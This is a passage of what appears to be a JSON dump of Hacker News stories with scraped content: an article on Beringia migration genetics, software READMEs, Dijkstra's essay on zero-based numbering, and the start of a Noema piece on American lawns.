conduct phylogenetic analyses. Most often, phylogenetics refers to sorting out the evolutionary relationships between different organisms, using genetic similarities and differences to construct an accurate family tree of species. But because languages, like life, gradually evolve over time, linguists have put the same sort of analysis to work in constructing language trees. ^\n\n“The researchers collected data on two Yeniseian languages, 37 Na-Dene languages and Haida (a language spoken on Canada’s Pacific coast but not believed to be related to Na-Dene, used as a control) from the Alaska Native Language Archive and several other published sources. Then, they used phylogenetic algorithms to create a family tree of the forty languages, determining which were most closely related based on the number of similarities (such as phonemes that serve particular roles in the language’s grammar, for instance). ^\n\n\tMap of human migrations\n\n“Their tree confirmed that Yenesian and Na-Dene are related—and that Haida is not—but because these languages were carried by populations of humans that were moving over time, the lengths of branches in the tree also allowed Sicoli and Horton to weigh the odds of two different migration hypotheses. The first, proposed by many linguists, held that the source of both the Yenesian and Na-Dene languages was in Asia, with a subset of its speakers migrating across Beringia and bringing evolved versions of the language to North America. The second held that the source was in Beringia itself, with subsets of its speakers fanning out over both Siberia and North America. ^\n\n“The phylogenetic analysis, based on the degree of similarities between Yenesian and Na-Dene languages and within both groups, strongly supported the latter hypothesis—meaning that residents of communities as far apart as Central Siberia and the Great Plains share common ancestors, who likely lived in Beringia for an extended period of time. “Growing up, I’d look at maps showing migrations to the Americas, and they’d always just show arrows going in one direction: straight across from Asia to North America,” Sicoli says. “What we see now is something more complicated, because some of those arrows go back to Siberia, and it wasn’t a non-stop trip.” ^\n\n“This fits with what we know about the geography of the region at the time. Asia and Alaska were connected by a land bridge because global sea levels were much lower, largely because of how much water was locked up in glaciers that covered much more of the planet than today. But even though these glaciers opened up the corridor between North America and Asia, they also closed the door, because, as mentioned before, Alaska itself was under a thick sheet of ice at that time. Thus, the land bridge was a dead end, potentially explaining why these ancient migrants could have spent about 10,000 years in Beringia. Then, about 17,000 years ago, the glaciers began to recede—and sea levels began to rise—providing two reasons to leave Beringia, either for new territory in Alaska or back toward Siberia.”\n\n24,000-Year-Old Siberian DNA Suggests Native Americans More Closely Linked to Eurasians than East Asians\n\nMeeri Kim wrote in the Washington Post: “The genetic analysis of a 24,000-year-old arm bone from an ancient Siberian boy suggests that Native Americans have a more complicated ancestry than scientists realized, with some of their distant kin looking more Eurasian than East Asian.\nThe new study, published in the journal Nature, represents the oldest genome of a modern human ever fully sequenced. [Source:  Meeri Kim, Washington Post, November 20, 2013 ||+||]\n\n“Modern-day Native Americans share from 14 to 38 percent of their DNA with the Siberian hunter-gatherers — who are not closely related to East Asians — with the remainder coming from East Asian ancestors. Most scientists have thought that the first Americans came only from the East Asian populations. “If you read about the origins of Native Americans, it will say East Asians somehow crossed the Bering Sea,” said study author and evolutionary biologist Eske Willerslev at Copenhagen University. “This is definitely not the case — it’s more complex than that.” ||+||\n\n“It isn’t known where or when the meeting of the two peoples happened, but a likely location could be Beringia, the region surrounding the current gap between Alaska and Siberia. Although presently occupied by the Bering Strait and its surrounding waters, the glaciers of roughly 20,000 years ago locked up much of the earth’s water, exposing a land bridge between the two continents. The prehistoric crossroad provided an easy way for people, animals and plants to spread. ||+||\n\n“Originally excavated in the 1950s, the remains of the boy had been tucked away in the bowels of a museum in St. Petersburg. He was about 3 when he died, and he was buried with a variety of “grave goods,” including a swan figurine and an ivory pendant. When Willerslev sequenced the DNA from the boy’s upper arm bone, he thought the results were a mistake: It said the boy belonged to a lineage commonly found among Europeans, but not in East Asians. “We put the study on hold for a year because I thought it was contamination,” Willerslev said. They tried again, this time digging deeper and looking at the Y chromosome. It and the rest of the genome told the same story: The boy had links to present-day western Eurasians and Native Americans, but not East Asians. ||+||\n\n“They also sequenced a more recent Siberian adult whose DNA wasn’t as well preserved, and they got similar results. “They were members of a really cosmopolitan group that probably reflect early modern humans leaving Africa and spreading into central Asia,” said study author Kelly Graf, a Texas A&M anthropologist. Their results support fossil evidence from early Paleo-Indian humans, such as a well-preserved skeleton known as Kennewick man found in Washington state. Dated to about 9,000 years old, he has facial features that don’t look East Asian but rather somewhat Caucasian — a mystery found replicated in other skulls. ||+||\n\n“The fact that the first Americans were already mixed to begin with could answer these controversies, Willerslev said. Any Western Eurasian genetic signatures found in Native Americans today were previously attributed to post-1492 colonial mixing with Europeans. “Maybe it has much deeper roots — from Siberia, not Europeans coming over in their boats,” Graf said.” ||+||\n\n\tFrequency of distribution of the main mtDNA American haplogroups in native Americans\n\nSingle Wave Migration Theory Versus Multiple Pulses Theory for the First Americans\n\nThere are two theories about the migration process of the first American: 1) it was a single migratory event, the so called single wave theory,  or 2) it occurred in multiple pulses, waves or migrations. The evidence gathered so far seems to suggest it was a single event or at least a dominant single event, with some sideshow migrations that didn’t leave much of a DNA impact. Tests on mitochondrial DNA taken from the few examples of ancient American DNA, Joel Achenbach wrote in the Washington Post, “have a genetic marker common today across the Americas, one that scientists say evolved in a prehistoric population that had been isolated for thousands of years in Beringia, the land mass between Alaska and Siberia that formed a bridge between the continents during the Ice Ages. Thus, according to the report, the Native Americans and the Paleoamericans are the same people, descended from the same Beringia population. They just look different because of recent evolution. [Source: Joel Achenbach, Washington Post,  May 15, 2014]\n\n“Most scientists have assumed that the first humans to come to the Americas traveled from Eurasia across the Bering land bridge that existed before the oceans rose after the Ice Ages. But there is great debate about whether this represented a single migratory event or multiple pulses of people from different parts of Eurasia and via different routes, including a coastal migration. One maverick theory, based on archeological finds, contends that people came from Europe, following the edge of the ice around the North Atlantic.\n\n“Adding to the mystery is that the Paleoamericans, such as Naia, didn’t look like later Native Americans. Naia had a small, projecting face, with narrow cheekbones, wide-set eyes and a prominent forehead. Native Americans of later millennia tended to have broader, longer, flatter faces, and rounder skulls, said James Chatters, an independent researcher based in Washington state.\n\n See Separate Article:  SINGLE WAVE VERSUS MULTIPLE PULSE THEORY AND MIGRATION OF EARLY PEOPLE TO AMERICA  factsanddetails.com\n\nGenetic Links Between Early Americans and Early Japanese\n\nAileen Kawagoe wrote in Heritage of Japan: A 1994 study concluded that ancestral lineages of Ainu people migrated across Beringia carrying HTLV-I virus (subtype A) to the American continent in the Paleolithic era. Phlylogenetic analysis of mitochondrial DNA and HLA type analysis suggest there is a relationship between Japanese and Paleo-Indians in South America (DRB10802 was found to be present in almost all Amerindians, Siberian Eskimos and Japanese Ainu but specifically two Meso and South Amerindian DRB1 alleles – DRB10411 and DRB10417- are also shared with Siberians and Asian Pacific coast populations (Ainu, Japanese and Taiwan) as well as Athabaskans and Eskimos (other First American inhabitants) with the exception of the Aleuts). [Source: Aileen Kawagoe, Heritage of Japan website, heritageofjapan.wordpress.com]\n\n“A 2000 American Scientist article suggested that the “highest frequencies of these four haplogroups occur in the Altai Mountain/Tuva/Lake Baikal region, implying that this general region gave rise to the founders of Native American populations. Otherwise, haplogroup B is absent in the vast majority of native Siberian populations, haplogroup A occurs at very low frequencies outside of Chukotka, and haplogroups C and D are the predominant mtDNA lineages in northern Asia.\n\n“However, the presence of a certain control region mutation in haplogroups C and D may point to alternative source areas for ancestral Native Americans. This mutation appears in the majority of both haplogroup C and D mtDNAs in Native American populations, suggesting it is part of the original sequence motifs for both of them. Among all Asian and Siberian mtDNAs, however, this mutation only appears in haplogroup C mtDNAs from Mongolia and the Amur River region and in haplogroup D mtDNAs in the Japanese, Korean and Ainu. This distribution suggests that East Asia as well as southeast Siberia or Mongolia might be source areas or migration pathways for these haplogroups.\"\n\nAdachi N, and others in a study of “Mitochondrial DNA analysis of Jomon skeletons” assigned D1a (along with M7a, N9b) to ancient DNA recovered from 16 Jomon skeletons excavated from Funadomari site, Hokkaido, Japan. The fact that Hokkaido Jomons shared haplogroup D1 with Native Americans validates the hypothesized genetic affinity of the Jomon people to Native Americans, providing direct evidence for the genetic relationships between these populations… It appears that the genetic study of ancient populations in northern part of Japan brings important information to the understanding of human migration in northeast Asia and America. Adachi N, and others in “Mitochondrial DNA analysis of Jomon skeletons from the Funadomari site, Hokkaido, and its implication for the origins of Native American“, Am J Phys Anthropol. 2009 Mar;138(3):255-65. doi: 10.1002/ajpa.20923)]\n\n See Separate Article:  FIRST JAPANESE AND THEIR IMPACT ON THE AMERICAS  factsanddetails.com\n\n\tNative American DNA subrace genetic groups\n\nDNA Studies on the Relationship Between North and South Americans\n\nSome studies have suggested that the first Americans diverged genetically from their Siberian and East Asian ancestors about 25,000 years ago. These people traveled across the Bering Strait Land Bridge and eventually split into distinct North and South American populations. By about 13,000 years ago, people of the Clovis culture, known for its use of distinctive, pointy stone tools, came to occupy much of North America. But by this time, people were already living as far south as Monte Verde, Chile. They had been there since a least 14,500 years ago, according to archaeological findings there. Still it is not totally clear how the Clovis culture were linked to populations in South America. [Source:  Laura Geggel, Live Science, November 9, 2018]\n\nAccording to an ancient DNA analysis published online November 8, 2018 in the journal Cell prehistoric people from different populations made their way across the Americas thousands of years ago.  People genetically linked to the Clovis culture, one of the earliest and best-known cultures in North America, migrated into South America as far back as 11,000 years ago but then mysteriously disappeared around 9,000 years ago. The 2018 study says that another ancient group of people replaced them, but it is certain how or why this occurred, and the population turnover happened across the entire continent of South America.\n\nLaura Geggel wrote in Live Science: To unravel the genetic mysteries of the these ancient Americans, the researchers reached out to indigenous peoples and government agencies all over Central and South America, asking for permission to study the remains of ancient peoples that have been discovered over the years. In all, the international team of scientists was given permission to do genomewide analyses on 49 ancient people whose remains were unearthed in the following Central and South American countries: Belize, Brazil, Peru, Chile and Argentina. The oldest of these people lived about 11,000 years ago, marking this as a study that takes a big step forward from previous research, which only included genetic data from people less than 1,000 years old, the researchers said.\n\nTheir findings showed that DNA associated with the North American Clovis culture was found in people from Chile, Brazil and Belize, but only between about 11,000 to 9,000 years ago.\n\"A key discovery was that a Clovis culture-associated individual from North America dating to around 12,800 years ago shares distinctive ancestry with the oldest Chilean, Brazilian and Belizean individuals,\" study co-lead author Cosimo Posth, postdoctoral researcher of archaeogenetics at the Max Planck Institute for the Science of Human History in Germany, said in a statement. \"This supports the hypothesis that the expansion of people who spread the Clovis culture in North America also reached Central and South America.\" [In Photos: New Clovis Site in Sonora]\n\nCuriously, around 9,000 years ago, the Clovis lineage disappears, the researchers found. Even today, there is no Clovis-associated DNA found in modern South Americans, the researchers said. This suggests that a continentwide population replacement happened at that time, said study co-senior researcher David Reich, a professor of genetics at Harvard Medical School and a Howard Hughes Medical Institute investigator. Following this mysterious disappearance, there is a surprising amount of genetic continuity between people who lived 9,000 years ago and those living today in multiple South American regions, the researchers said.\n\nAlthough these findings shed light on early Americans, it's far from complete. The researchers acknowledge that they don't have human remains that are older than about 11,000 years old, \"and thus we could not directly probe the initial movements of people into Central and South America,\" they wrote in the study. Moreover, although the study looked at 49 people who lived between about 11,000 and 3,000 years ago, the research would be more comprehensive if more ancient individuals from different regions were included, the researchers said.\n\n\"We lacked ancient data from Amazonia, northern South America and the Caribbean, and thus cannot determine how individuals in these regions relate to the ones we analyzed,\" Reich said in the statement. \"Filling in these gaps should be a priority for future work.\"\n\n\tPacific Basin Human Geography migrations\n\nCalifornia-Peruvian Connection\n\nThe 2018 Cell study also revealed an unexpected connection between ancient people living in California's Channel Islands and the southern Peruvian Andes at least 4,200 years ago. It appears that these two geographically distant groups have a shared ancestry, the researchers found. [Source:  Laura Geggel, Live Science, November 9, 2018]\n\nLaura Geggel wrote in Live Science:  It's unlikely that people living in the Channel Islands actually traveled south to Peru, the researchers said. Rather, it's possible that these groups' ancestors sallied forth thousands of years earlier, with some ending up in the Channel Islands and others in South America. But those genes didn't become common in Peru until much later, around 4,200 years ago, when the population may have exploded, the researchers said.\n\n\"It could be that this ancestry arrived in South America thousands of years before and we simply don't have earlier individuals showing it,\" study co-lead researcher Nathan Nakatsuka, a research assistant in the Reich lab at Harvard Medical School, said in the statement. \"There is archaeological evidence that the population in the Central Andes area greatly expanded after around 5,000 years ago. Spreads of particular subgroups during these events may be why we detect this ancestry afterward.\"\n\nFirst Americans from Australia?\n\nInhabitants of what is now Australia travelled by canoe to settle in the Americans more than 30,000 years ago, some anthropologists have argues. Reuters reported: in 2004 They would have island hopped via Japan and Polynesia to the Pacific coast of the Americas at a time when sea levels were lower than they are today, Dr Silvia Gonzalez from John Moores University in Liverpool said annual meeting of the British Association for the Advancement of Science in Exeter in 2004. The claim will be unwelcome to today's native Americans who came overland from Siberia and say they were there first. Most researchers say they came across the Bering Straits from Russia to Alaska at the end of the Ice Age, up to 15,000 years ago. [Source: Reuters, September 7, 2004]\n\nBut Gonzalez said skeletal evidence pointed strongly to Australian origins and hinted that recovered DNA would corroborate it. \"This is very contentious,\" said Gonzalez. \"[Native Americans] cannot claim to have been the first people there.\" She said there was very strong evidence that the first migration came from Australia to the Pacific coast of America. Skulls of a people with distinctively long and narrow heads discovered in Mexico and California predated by several thousand years the more rounded features of the skulls of native Americans.\n\nOne particularly well preserved skull of a long-face woman had been carbon dated to 12,700 years ago, whereas the oldest accurately dated native American skull was only about 9000 years old.  She said there were tales from Spanish missionaries of an isolated coastal community of long-face people in Baja California, known as the Pericues, who were of a completely different race and rituals from other communities in America at the time. \"They appear more similar to southern Asians and the populations of the Pacific Rim than they do to northern Asians,\" she said. \"You cannot have two face shapes coming from the same place.\" The last survivors were wiped out by diseases imported by the Spanish conquerors, Gonzalez said.\n\nResearchers have ruled out the theory that the first Americans were Pacific Islanders who boated across the open ocean, because people didn't migrate to Polynesia until around 3,000 years ago and genetic evidence shows that the first Americans are only very distantly related to Polynesians. [Source:  Laura Geggel, Live Science, October 9, 2023]\n\n See Separate Article:  PEOPLE WHO LIVED AUSTRALIA 20,000 TO 10,000 YEARS AGO  factsanddetails.com\n\nThose That Argue That DNA Doesn’t Tell the Whole Story\n\nFen Montaigne wrote in Smithsonian magazine: “Some archaeologists, like Ben A. Potter at the University of Alaska Fairbanks, emphasize that genetics can only provide a road map for new digs, not solid evidence of the Beringian Standstill theory or the settlement of the Americas 20,000 years ago. “Until there’s actual evidence that people were in fact there, then it remains just an interesting hypothesis,” he says. “All that is required is that [ancestral Native Americans] were genetically isolated from wherever the East Asians happened to be around that time. There’s absolutely nothing in the genetics that necessitates the Standstill had to be in Beringia. We don’t have evidence that people were in Beringia and Alaska then. But we do have evidence that they were around Lake Baikal and into the Russian Far East.” [Source: Fen Montaigne, Smithsonian magazine, January-February 2020]\n\n“After Potter unearthed the 11,500-year-old remains of two infants and a girl at the Upward Sun River site in Alaska’s Tanana Valley — among the oldest human remains found in North America — Willerslev sequenced the infants’ DNA. The two scientists were co-authors on a Nature paper that “support[ed] a long-term genetic structure in ancestral Native Americans, consistent with the Beringian ‘standstill model.’”\n\n“But Potter thinks that news stories on these and other findings have been too definitive. “One of the problems with the media coverage is its focus on a single hypothesis — a pre-16,000-year-old migration along the northwest coast — that is not well supported with evidence.” Potter remains doubtful that humans could have survived in most of Beringia during the bitter peak of the ice age, about 25,000 years ago. “Across the board,” he says, “from Europe all the way to the Bering Strait, this far north area is depopulated. There’s nobody there, and that lasts for a long time.”\n\nImage Sources:  Wikimedia Commons\n\nText Sources: National Geographic, New York Times, Washington Post, Los Angeles Times, Smithsonian magazine, Nature, Scientific American. Live Science, Discover magazine, Discovery News, Ancient Foods  ancientfoods.wordpress.com ; Times of London, Natural History magazine, Archaeology magazine, The New Yorker, Time, Newsweek, BBC, The Guardian, Reuters, AP, AFP and other publications.\n\nLast updated June 2024",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "9edf6993d22da2f3",
    "title": {
      "en": "The Case for Centralizing Authorization",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.aserto.com/blog/the-case-for-centralizing-authorization",
    "score": 34,
    "by": "mooreds",
    "time": 1742304017,
    "content": "ProductSolutionsDocsBlogCompanyTry it FREE\n\nCentralized vs Distributed AuthorizationWhat are the tradeoffs between running a central authorization service versus distributed authorizers?Jan 24th, 2025Authorization in 2024: Year in ReviewAs we ring in the new year, here’s a retrospective on authorization in 2024.Jan 1st, 2025Authorization at Gartner IAM Summit 2024Gartner IAM Summit is one of the top events in the identity universe, and Authorization is becoming a key pillar. Here’s our trip report.Dec 13th, 2024\n\nSign up for our newsletterGet the latest company updates and technology articlesEmail*First nameLast name",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "0f11a27fee1f9fd4",
    "title": {
      "en": "Bootstrap C projects without the pain",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://github.com/claeusdev/pricc",
    "score": 9,
    "by": "claeusdev",
    "time": 1742638036,
    "content": "pricc\nA minimal C project generator written in Rust.\nInstallation\nCan clone this repo and run the command below, must have rust installed.\ncargo install --path .\n\nEven better, easier:\ncargo install pricc\n\nAlternatively:\nwget https://github.com/claeusdev/pricc/releases/latest/download/pricc\nchmod +x pricc\nsudo mv pricc /usr/local/bin/\n\nUsage\nCreate a new C project:\npricc my_project                              # Basic project\npricc my_project -a \"John Doe\" -d \"My App\"    # With metadata\npricc my_project --standard c17 --tests       # C17 with tests\n\nAvailable options:\nOptions:\n  -a, --author <AUTHOR>            Author of the project\n  -d, --description <DESCRIPTION>  Description of the project\n  -s, --standard <STANDARD>        C standard [default: c11] [possible values: c89, c99, c11, c17]\n  -t, --tests                      Include test setup\n  -V, --proj-version <VERSION>     Project version [default: 0.1.0]\n  -h, --help                       Print help\n  -v, --version                    Print version\n\nGenerated Project Structure\nproject_name/\n├── src/           # Source files\n│   └── main.c\n├── include/       # Header files\n│   └── project.h\n├── tests/         # Test files (if enabled)\n│   └── test_main.c\n├── build/         # Build artifacts\n├── bin/           # Compiled binaries\n├── Makefile\n└── README.md\n\nLicense\nMIT",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "d6bb492b59d5a400",
    "title": {
      "en": "Numbering should start at zero (1982)",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.cs.utexas.edu/~EWD/transcriptions/EWD08xx/EWD831.html",
    "score": 103,
    "by": "checkyoursudo",
    "time": 1742549733,
    "content": "Why numbering\n        should start at zero\n\t\t\t\tTo denote the subsequence of natural numbers 2, 3, ..., 12 without the pernicious three dots, four conventions are open to us\n\n\t\t\t\t\t\ta)\n\n\t\t\t\t\t\t2 ≤ i < 13\n\n\t\t\t\t\t\tb)\n\n\t\t\t\t\t\t1 < i ≤ 12\n\n\t\t\t\t\t\tc)\n\n\t\t\t\t\t\t2 ≤ i ≤ 12\n\n\t\t\t\t\t\td)\n\n\t\t\t\t\t\t1 < i < 13\n\n\t\t\t\tAre there reasons to prefer one convention to the other? Yes, there are. The observation that conventions a) and b) have the advantage that the difference between the bounds as mentioned equals the length of the subsequence is valid. So is the observation that, as a consequence, in either convention two subsequences are adjacent means that the upper bound of the one equals the lower bound of the other. Valid as these observations are, they don't enable us to choose between a) and b); so let us start afresh.\n\t\t\t\tThere is a smallest natural number. Exclusion of the lower bound —as in b) and d)— forces for a subsequence starting at the smallest natural number the lower bound as mentioned into the realm of the unnatural numbers. That is ugly, so for the lower bound we prefer the ≤ as in a) and c). Consider now the subsequences starting at the smallest natural number: inclusion of the upper bound would then force the latter to be unnatural by the time the sequence has shrunk to the empty one. That is ugly, so for the upper bound we prefer < as in a) and d). We conclude that convention a) is to be preferred.\n\t\t\t\tRemarkThe programming language Mesa, developed at Xerox PARC, has special notations for intervals of integers in all four conventions. Extensive experience with Mesa has shown that the use of the other three conventions has been a constant source of clumsiness and mistakes, and on account of that experience Mesa programmers are now strongly advised not to use the latter three available features. I mention this experimental evidence —for what it is worth— because some people feel uncomfortable with conclusions that have not been confirmed in practice. (End of Remark.)\n\t\t\t\t**\n\t\t\t\t\t*\n\t\t\t\tWhen dealing with a sequence of length N, the elements of which we wish to distinguish by subscript, the next vexing question is what subscript value to assign to its starting element. Adhering to convention a) yields, when starting with subscript 1, the subscript range 1≤i<N+1; starting with 0, however, gives the nicer range 0≤ i<N. So let us let our ordinals start at zero: an element's ordinal (subscript) equals the number of elements preceding it in the sequence. And the moral of the story is that we had better regard —after all those centuries!— zero as a most natural number.\n\t\t\t\tRemarkMany programming languages have been designed without due attention to this detail. In FORTRAN subscripts always start at 1; in ALGOL 60 and in PASCAL, convention c) has been adopted; the more recent SASL has fallen back on the FORTRAN convention: a sequence in SASL is at the same time a function on the positive integers. Pity! (End of Remark.)\n\t\t\t\t**\n\t\t\t\t\t*\n\t\t\t\tThe above has been triggered by a recent incident, when, in an emotional outburst, one of my mathematical colleagues at the University —not a computing scientist— accused a number of younger computing scientists of \"pedantry\" because —as they do by habit— they started numbering at zero. He took consciously adopting the most sensible convention as a provocation. (Also the \"End of ...\" convention is viewed of as provocative; but the convention is useful: I know of a student who almost failed at an examination by the tacit assumption that the questions ended at the bottom of the first page.) I think Antony Jay is right when he states: \"In corporate religions as in others, the heretic must be cast out not because of the probability that he is wrong but because of the possibility that he is right.\"\n\n\t\t\t\t\t\tPlataanstraat 5\n\t\t\t\t\t\t\t5671 AL NUENEN\n\t\t\t\t\t\t\tThe Netherlands\n\n\t\t\t\t\t\t11 August 1982\n\t\t\t\t\t\t\tprof.dr. Edsger W. Dijkstra\n\t\t\t\t\t\t\tBurroughs Research Fellow\n\n\t\t\t\tTranscriber: Kevin Hely.\n\t\t\t\t\t\tLast revised on Fri, 2 May 2008.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "ab8a990f1ca06468",
    "title": {
      "en": "Napkin Math Tool",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://taylor.town/napkin-math",
    "score": 131,
    "by": "surprisetalk",
    "time": 1742224563,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "b923d95d74513bf8",
    "title": {
      "en": "Export Predefined Regions in Krita",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://github.com/aldanasjuan/krita_export_region",
    "score": 25,
    "by": "noisycarlos",
    "time": 1742491380,
    "content": "This plugin exports a desired region in the canvas and can optionally resize the export to a new size.\nPlease fork for changes. I made this with chatgpt for personal use and I don't have time to do proper open source. I'll ignore issues or feature requests since I'm not a python developer.\nInstall\nAdd the region_exporter folder to the resources folder, like your-resources-folder/pykrita/region_exporter\nAdd the region_exporter.desktop to the root of the pykrita folder. Should have a file like your-resources-folder/pykrita/region_exporter.desktop\nAdd the region_exporter.action to an 'actions' folder in the resources folder. Should have it like like your-resources-folder/actions/region_exporter.action\nIf you don't know what the your-resources-folder folder is, go to krita -> Settings -> Manage Resources -> Open Resource Folder\nUse\n\nUse ctrl+shift+e or go to Tools -> Scripts -> Export Region.\nAdd the coordinates (x,y) and the rect size (width, height).\nIf you want to resize, select a New Width and New Height.\nSelect a Rotation option. Same as rotating your image to the left or right.\nIf you select \"Export Selected Layers\" it will only export the selected layers, otherwise it exports the visible layers. Note: It doesn't support selecting a group, you must select the actual paint or vector layers you want.\nChoose an output file and you're done.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "bfaa7281ec987c04",
    "title": {
      "en": "The New Three-Tier Application",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.dbos.dev/blog/new-three-tier-application",
    "score": 67,
    "by": "qianli_cs",
    "time": 1742303075,
    "content": "Recent articlesMaking Apps Durable with 10x Less CodeBenchmarksMarch 20, 2025The New Three-Tier ApplicationDBOS ArchitectureMarch 5, 2025Durable Execution for Building Crashproof AI AgentsHow ToFebruary 24, 2025",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "e1758e0adb4e9a6b",
    "title": {
      "en": "Specializing Python with E-Graphs",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://vectorfold.studio/blog/egglog",
    "score": 61,
    "by": "dtseng123",
    "time": 1742302720,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "58de9e23dbdde759",
    "title": {
      "en": "The Cult of the American Lawn",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.noemamag.com/the-cult-of-the-american-lawn/",
    "score": 54,
    "by": "ecliptik",
    "time": 1742571493,
    "content": "The Cult Of The American Lawn\n                    Manicured grass yards are ecological dead zones. So why are they being forced on people by their neighbors and homeowner associations?\n\n        Haley Jiang for Noema Magazine\n\n        FeatureClimate Crisis\n\n        By Oliver Milman\n\n      March 20, 2025\n\n\t\t\t\t\t\t\t\tXBlueskyEmailLinkedInFacebook\n\n    Credits\n\n        OliverMilman is a New York-based journalist and environment correspondent for The Guardian.\n\nWhen Janet and Jeff Crouch sought to enliven their front yard in suburban Maryland with native black-eyed Susans, Joe-Pye weed, asters and coneflowers, they had no inkling that they were doing anything controversial.“It was a garden full of life and color,” Janet told me. “It was beautiful.” Her sister advocated for native plants and encouraged them to think about pollinators and avoid pesticides. Their endeavor eventually lured butterflies, bees, goldfinches and sometimes snakes to a thrumming oasis at the edge of Cedar Lane Park in Columbia, Maryland. But it also stirred the anger of a neighbor who, aided by the local homeowner association (HOA), demanded the Crouches revert to the norm. People’s yards are for lawns, they insisted, and little else.“We got a cease and desist letter from the HOA’s attorney, which was shocking, telling us to rip it all out,” said Janet, who works for the U.S. Department of Health. The neighbor argued that their biodiverse garden was an unsightly mess that was attracting unwanted visitors like deer and rodents to what was otherwise a sea of prim suburban lawns.“He was fairly sincere that you’re just not supposed to do that,” Jeff told me. “He was brainwashed that we should only have grass.” Janet added: “When we didn’t immediately comply, he started creating all these narratives around us that we were crazy.”\n\n      “When Janet and Jeff Crouch sought to enliven their front yard in suburban Maryland with native black-eyed Susans, Joe-Pye weed, asters and coneflowers, they had no inkling that they were doing anything controversial.”\n\n        Facebook\n        Twitter\n        Email\n\nIn 2017, the HOA demanded that the Crouches restore their grass lawn or risk fines or worse. The couple was undaunted. A years-long battle ensued. “You can’t let the bullies win,” Janet said. “And that’s what it felt like: We were being bullied on our own property.”The Crouches had unwittingly stumbled into a little-known battle over tidy neighborhood lawns. Celebrated in modern American suburbia, tended lawns have become a prized avatar of the American dream of home ownership, a key backdrop to neighborhood rituals and a symbol of order and calm and safety — of a good life. The moral rectitude around lawns has been given muscle through HOAs — which govern neighborhoods home to more than 75 million Americans — and town and city ordinances that stipulate how long grass can be and how often people should trim it.Those who draw the ire of their neighbors by cultivating something other than a grass monoculture can face stiff penalties: Last year, authorities in Catskill, a bucolic town in New York, took a resident to court and threatened her with fines of $1,000 a day for not mowing her pollinator-friendly natural garden.How did the American lawn become the site of such vicious disagreements? American culture embodies a zeal for individuality and property rights — of the idea that people should be able to conduct their own affairs in their own territory without the neighbors or the government imposing their views and forcing conformity. Like so many other cultural quarrels, the lawn has this deep contradiction at its heart.The roots of this American obsession with a neat lawn are surprisingly shallow, initially imported from European sensibilities. Defenders of castles in medieval England and France would often cut back vegetation near the fortification to enable clear sight lines of potential invaders, an unintentional aesthetic that was later replicated in grand, sweeping lawns of aristocratic country estates.Such vistas did not greet the early European colonists in America, with the native grasses on the eastern seaboard mostly broom straw, wild rye and marsh grass — varieties that didn’t have the lush, carpet-like look of those seen in Europe. Native Americans had already altered this landscape for hunting, but white settlers then upended it with the introduction of grazing cattle, sheep and goats that decimated the local grasses and opened terrain for favored types of imported replacement grass.Paintings of the period often show dwellings surrounded by wildflowers or dirt. Having a vegetable patch or a few animals nearby was more attainable than the back-breaking maintenance required to plant and tame a lawn, which was the preserve only of the wealthy, aspirational elite who could afford teams of scythe-wielding servants. Thomas Jefferson had a celebrated lawn — which comes from the French word “launde,” meaning glade or cleared area — at his Monticello estate, while George Washington employed English landscape gardeners to achieve the same at Mount Vernon.\n\n      “Celebrated in modern American suburbia, tended lawns have become a prized avatar of the American dream of home ownership, a key backdrop to neighborhood rituals and a symbol of order and calm and safety — of a good life.”\n\n        Facebook\n        Twitter\n        Email\n\nAs the 19th and then 20th centuries unspooled, though, the idealized lawn came within reach for more Americans. The invention of lawnmowers in the first half of the 19th century and, later, sprinklers reduced the amount of labor needed to nurture a lawn, and a new vision of park-like suburbia started to bloom, partly spurred by Frederick Law Olmsted, the landscape architect famous for creating New York City’s Central Park. In 1868, Olmsted was tasked with designing one of the country’s first planned suburban communities near Chicago, with each house set back 30 feet from the street and the connected lawns giving the impression of a flowing park rather than the high walls that often separated homes in England.Within a few decades, a manicured lawn had become a fetishized status symbol. In “The Great Gatsby,” Jay Gatsby is so perturbed by the difference between the lavish grounds of his mansion and the scruffy yard abutting Nick Carraway’s nearby rented house that he sends his own gardeners to tame the unruly patch. “We both looked at the grass — there was a sharp line where my ragged lawn ended and the darker, well-kept expanse of his began,” Carraway concedes.Then, as government loans helped millions of soldiers returning from the ravages of World War II to obtain their own homes, the model of identikit suburbia, complete with a swatch of emerald lawn, became the norm. “A fine lawn makes a frame for a dwelling,” said Abraham Levitt, the pioneering architect who, with his two sons, built the first Levittowns, the planned suburbs that became the desired template for American middle-class life. “It is the first thing a visitor sees. And first impressions are the lasting ones.”The growing popularity of golf, with its courses’ trimmed grass aesthetic, and the spread of car culture helped push Americans deeper into a cult of civilized lawns. New, hardier types of grass, such as Kentucky bluegrass — which, despite its name, is usually thought to have arrived with the Spanish — became ubiquitous. The lawn care industry began to heavily market an American sense of pride in the home and disciplined yard work as a leisure pursuit. Lawn care became entwined with neighborliness and even a measure of whether the homeowner was a solid, dependable provider. As Ted Steinberg, a history professor at Case Western Reserve University and an authority on the advancement of the lawn, put it in his book “American Green,” “The perfect lawn rose to become an icon of the American Dream.”“The American lawn is a thing, and it is American, deeply American,” Paul Robbins, an expert in environmental studies at the University of Wisconsin-Madison and the author of the book “Lawn People,” told me. “There becomes a kind of local social pressure to make sure you’re not letting down the neighborhood — you’re keeping up the property values. Those then become morally normative.”This devotion has turned the U.S. into the undisputed global superpower of lawns. Around 40 million acres of lawn, an area almost as large as the state of Georgia, carpets the nation. Lawn grass occupies more area than corn. Each year, enough water to 